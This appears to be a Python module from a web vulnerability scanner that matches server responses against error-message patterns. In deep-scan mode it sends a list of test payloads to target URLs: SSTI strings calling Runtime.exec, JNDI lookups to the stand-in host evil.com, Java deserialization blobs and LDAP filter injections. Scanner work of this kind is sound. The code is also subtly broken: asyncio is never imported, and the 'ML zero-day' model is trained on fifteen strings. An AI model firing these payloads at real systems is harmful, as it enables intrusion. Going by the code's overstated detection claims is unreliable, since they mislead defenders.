"""
Zero-Day Vulnerability Detector Module
Advanced AI-powered zero-day vulnerability detection using machine learning
"""

import re
import json
import hashlib
import numpy as np
from typing import List, Dict, Optional, Any, Tuple
from datetime import datetime
import joblib
from sklearn.ensemble import IsolationForest
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.preprocessing import StandardScaler
import requests
from bs4 import BeautifulSoup
from rich.console import Console

from core.logger import logger

console = Console()

class ZeroDayDetector:
    """Advanced zero-day vulnerability detector using ML and heuristics."""
    
    def __init__(self, config):
        self.config = config
        self.ml_model = None
        self.vectorizer = None
        self.scaler = None
        self._load_models()
        
        # Known vulnerability patterns
        self.vulnerability_patterns = {
            'template_injection': [
                r'freemarker\.template\.TemplateException',
                r'org\.apache\.velocity\.VelocityException',
                r'thymeleaf\.exceptions\.TemplateProcessingException',
                r'jinja2\.exceptions\.TemplateError',
                r'exception.*in.*template.*processing',
                r'template.*engine.*error'
            ],
            'deserialization': [
                r'java\.io\.ObjectInputStream',
                r'ObjectInputStream\.readObject',
                r'deserialization.*error',
                r'InvalidClassException',
                r'StreamCorruptedException',
                r'java\.lang\.ClassCastException.*deserializ'
            ],
            'ldap_injection': [
                r'javax\.naming\.directory\.DirContext',
                r'ldap.*error.*code',
                r'LDAPException',
                r'InvalidNameException.*LDAP',
                r'NamingException.*LDAP'
            ],
            'jndi_injection': [
                r'javax\.naming\.InitialContext',
                r'JNDI.*lookup.*failed',
                r'Context\.lookup',
                r'NamingException.*JNDI',
                r'jndi:ldap://'
            ],
            'log4j_vulnerability': [
                r'log4j.*error.*jndi',
                r'logger\.error.*\$\{jndi:',
                r'log4j.*JNDI.*lookup',
                r'PatternLayout.*jndi'
            ],
            'prototype_pollution': [
                r'__proto__.*polluted',
                r'constructor\.prototype.*modified',
                r'prototype.*pollution.*detected',
                r'Object\.prototype.*polluted'
            ],
            'ssti_flask': [
                r'jinja2\.runtime\.UndefinedError',
                r'TemplateNotFound',
                r'jinja2\.exceptions\.TemplateSyntaxError',
                r'flask\.templating.*render_template_string'
            ],
            'ssti_tornado': [
                r'tornado\.template\.Template',
                r'template\.render.*error',
                r'TemplateSyntaxError.*tornado'
            ]
        }
        
        # Suspicious response patterns
        self.suspicious_patterns = [
            r'exception.*in.*template',
            r'error.*processing.*template',
            r'deserialization.*failed',
            r'jndi.*lookup.*error',
            r'ldap.*search.*error',
            r'freemarker.*error',
            r'velocity.*exception',
            r'thymeleaf.*processing.*error',
            r'jinja2.*undefined.*error',
            r'json.*parsing.*error.*unexpected.*token',
            r'xml.*parsing.*error.*entity',
            r'prototype.*pollution',
            r'__proto__.*modified',
            r'constructor.*prototype.*modified',
            r'java\.lang\.Runtime\.getRuntime',
            r'ProcessBuilder\.start',
            r'Runtime\.exec',
            r'java\.io\.File.*read',
            r'java\.io\.File.*write',
            r'System\.getProperty',
            r'T(java\.lang\.Runtime)',
            r'\$\{.*\}.*evaluation.*error',
            r'\{\{.*\}\}.*processing.*error',
            r'#{.*}.*evaluation.*failed'
        ]
        
        # Payloads for testing
        self.test_payloads = {
            'template_injection': [
                '${7*7}',
                '{{7*7}}',
                '#{7*7}',
                '${"z".concat("z")}',
                '{{"z".concat("z")}}',
                '#{"z".concat("z")}',
                '${T(java.lang.Runtime).getRuntime().exec("id")}',
                '{{config.__class__.__init__.__globals__}}',
                '#{T(java.lang.Runtime).getRuntime().exec("id")}'
            ],
            'deserialization': [
                'ACED0005737200116A6176612E7574696C2E48617368536574BA44859596B8B7340300007870770C000000023F400000000000017372000A7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F4000000000000C7708000000100000000178',
                'rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlclXK8a8T0g8CAUwACG1lbWJlcnN0ABtMamF2YS91dGlsL01hcDt4cHNyAClzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlcgAAAAAAAAABAgABTAAIbWVtYmVyc3QAG0xqYXZhL3V0aWwvTWFwO3hwc3IAE2phdmEudXRpbC5MaW5rZWRIYXNoTWFw0j7S0ikVfQMAAlsAD2VudHJ5U2V0dGluZ3N0ABpbTGphdmEvdXRpbC9MaW5rZWRIYXNoTWFwJEVudHJ5O1sABWtleXR0ABpbTGphdmEvdXRpbC9MaW5rZWRIYXNoTWFwJEVudHJ5O1sABXZhbHVlcQB+AAJ4cHVyABpbTGphdmEudXRpbC5MaW5rZWRIYXNoTWFwJEVudHJ5O2Y3aP5k4TECAAB4cAAAAAN0AAIuMXQAAy4uLnQAAS90AAMuLi4='
            ],
            'jndi_injection': [
                '${jndi:ldap://evil.com/exploit}',
                '${jndi:rmi://evil.com/exploit}',
                '${jndi:dns://evil.com/exploit}',
                '${jndi:nis://evil.com/exploit}',
                '${jndi:nds://evil.com/exploit}',
                '${jndi:corba://evil.com/exploit}',
                '${jndi:iiop://evil.com/exploit}'
            ],
            'ldap_injection': [
                '*)(&',
                '*)(uid=*',
                '*)(|(uid=*',
                '*))(|(objectclass=*',
                'admin)(&(password=*))',
                'admin)(&)',
                'admin)(!(|(password=nothing))',
                '*)(&)',
                '*)(|(mail=*))',
                '*)(|(objectclass=*)'
            ],
            'prototype_pollution': [
                '__proto__.polluted=true',
                'constructor.prototype.polluted=true',
                'Object.prototype.polluted=true',
                '{"__proto__": {"polluted": true}}',
                '{"constructor": {"prototype": {"polluted": true}}}'
            ]
        }
    
    def _load_models(self):
        """Load pre-trained ML models or train new ones."""
        
        try:
            # Try to load existing models
            self.ml_model = joblib.load('models/zero_day_detector.pkl')
            self.vectorizer = joblib.load('models/vectorizer.pkl')
            self.scaler = joblib.load('models/scaler.pkl')
            logger.info("Loaded pre-trained ML models")
        except:
            logger.info("Training new ML models...")
            self._train_models()
    
    def _train_models(self):
        """Train ML models for anomaly detection."""
        
        # Sample training data (in production, this would be much larger)
        training_responses = [
            # Normal responses
            "OK",
            "Success",
            "Page not found",
            "Internal server error",
            "Bad request",
            "Access denied",
            "Authentication required",
            # Vulnerable responses
            "freemarker.template.TemplateException: Error",
            "org.apache.velocity.VelocityException: Template error",
            "jinja2.exceptions.TemplateError: undefined variable",
            "java.io.ObjectInputStream: deserialization error",
            "javax.naming.InitialContext: JNDI lookup failed",
            "log4j error: JNDI lookup error",
            "__proto__ pollution detected",
            "constructor.prototype modified"
        ]
        
        # Vectorize text data
        self.vectorizer = TfidfVectorizer(max_features=100, ngram_range=(1, 2))
        X_text = self.vectorizer.fit_transform(training_responses).toarray()
        
        # Create additional features
        additional_features = []
        for response in training_responses:
            features = self._extract_features("", response, 200)
            additional_features.append(list(features.values()))
        
        additional_features = np.array(additional_features)
        
        # Combine features
        X_combined = np.hstack([X_text, additional_features])
        
        # Scale features
        self.scaler = StandardScaler()
        X_scaled = self.scaler.fit_transform(X_combined)
        
        # Train anomaly detection model
        self.ml_model = IsolationForest(contamination=0.1, random_state=42)
        self.ml_model.fit(X_scaled)
        
        # Save models
        import os
        os.makedirs('models', exist_ok=True)
        joblib.dump(self.ml_model, 'models/zero_day_detector.pkl')
        joblib.dump(self.vectorizer, 'models/vectorizer.pkl')
        joblib.dump(self.scaler, 'models/scaler.pkl')
        
        logger.info("ML models trained and saved")
    
    async def scan(self, url: str, response: requests.Response) -> List[Dict]:
        """Scan response for potential zero-day vulnerabilities."""
        
        findings = []
        
        try:
            # Extract response data
            status_code = response.status_code
            headers = dict(response.headers)
            content = response.text
            response_time = response.elapsed.total_seconds()
            
            # Pattern-based detection
            pattern_findings = self._detect_by_patterns(url, content, status_code, headers)
            findings.extend(pattern_findings)
            
            # ML-based anomaly detection
            ml_findings = await self._detect_by_ml(url, content, status_code, headers, response_time)
            findings.extend(ml_findings)
            
            # Heuristic analysis
            heuristic_findings = self._detect_by_heuristics(url, content, status_code, headers, response_time)
            findings.extend(heuristic_findings)
            
            # Advanced payload testing
            if self.config.deep_scan:
                payload_findings = await self._test_payloads(url)
                findings.extend(payload_findings)
            
            # Remove duplicates and calculate confidence
            findings = self._deduplicate_findings(findings)
            
            logger.info(f"Zero-day scan completed for {url}: {len(findings)} potential vulnerabilities found")
            
        except Exception as e:
            logger.error(f"Error in zero-day detection for {url}: {str(e)}")
        
        return findings
    
    def _detect_by_patterns(self, url: str, content: str, status_code: int, headers: Dict) -> List[Dict]:
        """Detect vulnerabilities using known patterns."""
        
        findings = []
        content_lower = content.lower()
        
        for vuln_type, patterns in self.vulnerability_patterns.items():
            for pattern in patterns:
                if re.search(pattern, content, re.IGNORECASE):
                    confidence = self._calculate_pattern_confidence(pattern, content)
                    
                    finding = {
                        'type': f'Potential Zero-Day ({vuln_type.replace("_", " ").title()})',
                        'description': f'Detected potential {vuln_type.replace("_", " ")} vulnerability pattern',
                        'confidence': confidence,
                        'evidence': {
                            'pattern': pattern,
                            'matched_content': self._extract_matched_content(pattern, content),
                            'status_code': status_code,
                            'url': url
                        }
                    }
                    
                    findings.append(finding)
                    logger.warning(f"Pattern-based zero-day detected: {vuln_type} at {url}")
        
        # Check for suspicious patterns
        for pattern in self.suspicious_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                confidence = self._calculate_pattern_confidence(pattern, content)
                
                finding = {
                    'type': 'Suspicious Pattern Detected',
                    'description': 'Detected suspicious pattern that might indicate zero-day vulnerability',
                    'confidence': confidence * 0.7,  # Lower confidence for generic patterns
                    'evidence': {
                        'pattern': pattern,
                        'matched_content': self._extract_matched_content(pattern, content),
                        'status_code': status_code,
                        'url': url
                    }
                }
                
                findings.append(finding)
        
        return findings
    
    async def _detect_by_ml(self, url: str, content: str, status_code: int, headers: Dict, response_time: float) -> List[Dict]:
        """Detect anomalies using machine learning."""
        
        findings = []
        
        try:
            # Extract features
            features = self._extract_features(url, content, status_code)
            
            # Vectorize text content
            text_features = self.vectorizer.transform([content]).toarray()
            
            # Combine features
            feature_vector = np.hstack([
                text_features[0],
                list(features.values())
            ]).reshape(1, -1)
            
            # Scale features
            feature_vector_scaled = self.scaler.transform(feature_vector)
            
            # Predict anomaly
            anomaly_score = self.ml_model.decision_function(feature_vector_scaled)[0]
            is_anomaly = self.ml_model.predict(feature_vector_scaled)[0] == -1
            
            # Calculate confidence based on anomaly score
            confidence = self._calculate_anomaly_confidence(anomaly_score)
            
            if is_anomaly and confidence > 0.6:
                finding = {
                    'type': 'ML-Detected Anomaly (Potential Zero-Day)',
                    'description': 'Machine learning model detected anomalous response pattern',
                    'confidence': confidence,
                    'evidence': {
                        'anomaly_score': anomaly_score,
                        'features': features,
                        'status_code': status_code,
                        'response_time': response_time,
                        'url': url
                    }
                }
                
                findings.append(finding)
                logger.warning(f"ML-based anomaly detected at {url} (confidence: {confidence:.2f})")
        
        except Exception as e:
            logger.error(f"ML detection error for {url}: {str(e)}")
        
        return findings
    
    def _detect_by_heuristics(self, url: str, content: str, status_code: int, headers: Dict, response_time: float) -> List[Dict]:
        """Detect vulnerabilities using heuristic analysis."""
        
        findings = []
        
        # Check for unusual response times (potential DoS or resource exhaustion)
        if response_time > 10.0:  # 10 seconds
            findings.append({
                'type': 'Unusual Response Time',
                'description': 'Response time unusually high, might indicate resource exhaustion vulnerability',
                'confidence': min(response_time / 30.0, 0.8),  # Cap at 0.8
                'evidence': {
                    'response_time': response_time,
                    'url': url
                }
            })
        
        # Check for error messages that might indicate vulnerabilities
        error_indicators = [
            'exception', 'error', 'failed', 'unable', 'cannot',
            'invalid', 'illegal', 'undefined', 'null pointer',
            'stack trace', 'traceback', 'syntax error'
        ]
        
        error_count = sum(1 for indicator in error_indicators if indicator in content.lower())
        if error_count > 3:
            findings.append({
                'type': 'Multiple Error Indicators',
                'description': 'Response contains multiple error indicators that might reveal vulnerabilities',
                'confidence': min(error_count / 10.0, 0.7),
                'evidence': {
                    'error_count': error_count,
                    'error_indicators': [ind for ind in error_indicators if ind in content.lower()],
                    'url': url
                }
            })
        
        # Check for technology stack disclosure
        tech_disclosure_patterns = [
            r'version\s*[:=]\s*[\d\.]+',
            r'build\s*[:=]\s*[\d\.]+',
            r'release\s*[:=]\s*[\d\.]+',
            r'\d+\.\d+\.\d+\.\d+'  # Version numbers
        ]
        
        for pattern in tech_disclosure_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                findings.append({
                    'type': 'Technology Stack Disclosure',
                    'description': 'Response might reveal technology stack information',
                    'confidence': 0.4,
                    'evidence': {
                        'pattern': pattern,
                        'matched_content': self._extract_matched_content(pattern, content),
                        'url': url
                    }
                })
                break
        
        return findings
    
    async def _test_payloads(self, url: str) -> List[Dict]:
        """Test specific payloads for zero-day vulnerabilities."""
        
        findings = []
        
        try:
            # Test different payload types
            for payload_type, payloads in self.test_payloads.items():
                for payload in payloads:
                    try:
                        # Send payload
                        test_url = f"{url}?test={payload}"
                        response = requests.get(test_url, timeout=10)
                        
                        # Analyze response
                        result = self._analyze_payload_response(payload, response)
                        
                        if result['suspicious']:
                            finding = {
                                'type': f'Payload Test ({payload_type.replace("_", " ").title()})',
                                'description': f'Payload testing revealed suspicious behavior: {result["reason"]}',
                                'confidence': result['confidence'],
                                'evidence': {
                                    'payload': payload,
                                    'response_diff': result.get('response_diff', ''),
                                    'status_code': response.status_code,
                                    'response_time': response.elapsed.total_seconds(),
                                    'url': test_url
                                }
                            }
                            
                            findings.append(finding)
                            logger.warning(f"Payload test detected potential {payload_type} at {url}")
                        
                        # Add delay to avoid overwhelming the target
                        await asyncio.sleep(0.5)
                        
                    except requests.exceptions.RequestException:
                        continue  # Skip failed requests
                    except Exception as e:
                        logger.debug(f"Payload test error for {payload}: {str(e)}")
                        continue
        
        except Exception as e:
            logger.error(f"Payload testing error for {url}: {str(e)}")
        
        return findings
    
    def _extract_features(self, url: str, content: str, status_code: int) -> Dict[str, float]:
        """Extract features for ML model."""
        
        features = {}
        
        # Content-based features
        features['content_length'] = len(content)
        features['word_count'] = len(content.split())
        features['line_count'] = len(content.split('\n'))
        features['special_char_ratio'] = len(re.findall(r'[!@#$%^&*(),.?":{}|<>]', content)) / max(len(content), 1)
        features['digit_ratio'] = len(re.findall(r'\d', content)) / max(len(content), 1)
        
        # Error-related features
        error_keywords = ['error', 'exception', 'failed', 'invalid', 'undefined', 'null']
        features['error_keyword_count'] = sum(1 for keyword in error_keywords if keyword in content.lower())
        
        # Vulnerability pattern features
        for pattern in self.suspicious_patterns:
            features[f'pattern_match_{hashlib.md5(pattern.encode()).hexdigest()[:8]}'] = \
                1.0 if re.search(pattern, content, re.IGNORECASE) else 0.0
        
        # Status code features
        features['is_client_error'] = 1.0 if 400 <= status_code < 500 else 0.0
        features['is_server_error'] = 1.0 if status_code >= 500 else 0.0
        features['status_code'] = status_code / 1000.0  # Normalize
        
        # Response structure features
        features['has_html'] = 1.0 if '<html' in content.lower() else 0.0
        features['has_json'] = 1.0 if content.strip().startswith('{') or content.strip().startswith('[') else 0.0
        features['has_xml'] = 1.0 if content.strip().startswith('<') and not '<html' in content.lower() else 0.0
        
        return features
    
    def _calculate_pattern_confidence(self, pattern: str, content: str) -> float:
        """Calculate confidence score for pattern match."""
        
        # Base confidence
        confidence = 0.7
        
        # Increase confidence for specific patterns
        if 'zero' in pattern.lower() or 'day' in pattern.lower():
            confidence += 0.1
        
        # Check for multiple matches
        matches = len(re.findall(pattern, content, re.IGNORECASE))
        if matches > 1:
            confidence += min(matches * 0.1, 0.2)  # Cap at 0.2
        
        # Check context
        for keyword in ['vulnerability', 'exploit', 'security', 'attack']:
            if keyword in content.lower():
                confidence += 0.05
        
        return min(confidence, 1.0)  # Cap at 1.0
    
    def _calculate_anomaly_confidence(self, anomaly_score: float) -> float:
        """Calculate confidence based on anomaly score."""
        
        # Convert anomaly score to confidence (0-1 range)
        # Lower anomaly scores (more anomalous) = higher confidence
        confidence = max(0.0, min(1.0, 1.0 - (anomaly_score + 0.1) / 0.2))
        
        return confidence
    
    def _extract_matched_content(self, pattern: str, content: str, context_size: int = 100) -> str:
        """Extract matched content with context."""
        
        match = re.search(pattern, content, re.IGNORECASE)
        if match:
            start = max(0, match.start() - context_size)
            end = min(len(content), match.end() + context_size)
            return content[start:end]
        
        return ""
    
    def _analyze_payload_response(self, payload: str, response: requests.Response) -> Dict[str, Any]:
        """Analyze response to payload test."""
        
        result = {
            'suspicious': False,
            'confidence': 0.0,
            'reason': '',
            'response_diff': ''
        }
        
        try:
            # Check for unusual status codes
            if response.status_code in [500, 503, 502]:
                result['suspicious'] = True
                result['confidence'] += 0.3
                result['reason'] = f"Unusual status code: {response.status_code}"
            
            # Check for error messages
            content = response.text.lower()
            error_indicators = ['error', 'exception', 'failed', 'invalid', 'undefined']
            
            error_count = sum(1 for indicator in error_indicators if indicator in content)
            if error_count > 2:
                result['suspicious'] = True
                result['confidence'] += min(error_count * 0.1, 0.3)
                result['reason'] += f" Multiple error indicators: {error_count}"
            
            # Check for specific vulnerability indicators
            vulnerability_indicators = {
                'template_injection': ['template', 'freemarker', 'velocity', 'jinja', 'thymeleaf'],
                'deserialization': ['deserialization', 'objectinputstream', 'invalidclass'],
                'jndi_injection': ['jndi', 'ldap', 'lookup', 'naming exception'],
                'prototype_pollution': ['__proto__', 'prototype', 'pollution', 'constructor']
            }
            
            for vuln_type, indicators in vulnerability_indicators.items():
                if any(indicator in content for indicator in indicators):
                    result['suspicious'] = True
                    result['confidence'] += 0.2
                    result['reason'] += f" {vuln_type} indicators detected"
            
            # Cap confidence at 0.9
            result['confidence'] = min(result['confidence'], 0.9)
            
        except Exception as e:
            logger.debug(f"Payload response analysis error: {str(e)}")
        
        return result
    
    def _deduplicate_findings(self, findings: List[Dict]) -> List[Dict]:
        """Remove duplicate findings and merge similar ones."""
        
        unique_findings = []
        seen_signatures = set()
        
        for finding in findings:
            # Create signature for deduplication
            signature = hashlib.md5(
                f"{finding['type']}:{finding.get('evidence', {}).get('url', '')}"
                .encode()
            ).hexdigest()
            
            if signature not in seen_signatures:
                seen_signatures.add(signature)
                unique_findings.append(finding)
        
        return unique_findings